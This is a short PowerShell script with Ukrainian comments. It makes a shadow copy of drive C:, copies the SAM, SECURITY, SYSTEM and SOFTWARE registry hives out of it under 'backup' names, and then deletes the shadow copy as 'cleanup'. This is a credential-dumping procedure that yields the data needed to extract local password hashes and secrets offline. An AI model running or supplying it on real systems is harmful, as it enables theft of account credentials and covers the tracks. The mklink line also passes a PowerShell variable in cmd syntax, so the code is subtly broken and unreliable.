# 1. Створіть тіньову копію диска C:
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
$shadowID = $shadow.ShadowID

# 2. Знайдіть шлях до тіньової копії
$device = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadowID }
$volumePath = $device.DeviceObject + "\"

# 3. Скопіюйте SAM з тіньової копії
cmd /c mklink /d C:\ShadowCopy "%volumePath%"
Copy-Item "C:\ShadowCopy\Windows\System32\config\SAM" "C:\SAM_backup" -Force
Copy-Item "C:\ShadowCopy\Windows\System32\config\SECURITY" "C:\SECURITY_backup" -Force
Copy-Item "C:\ShadowCopy\Windows\System32\config\SYSTEM" "C:\SYSTEM_backup" -Force
Copy-Item "C:\ShadowCopy\Windows\System32\config\SOFTWARE" "C:\SOFTWARE_backup" -Force

# 4. Видаліть тіньову копію (очищення)
$device.Delete()
#Remove-Item C:\ShadowCopy -Recurse -Force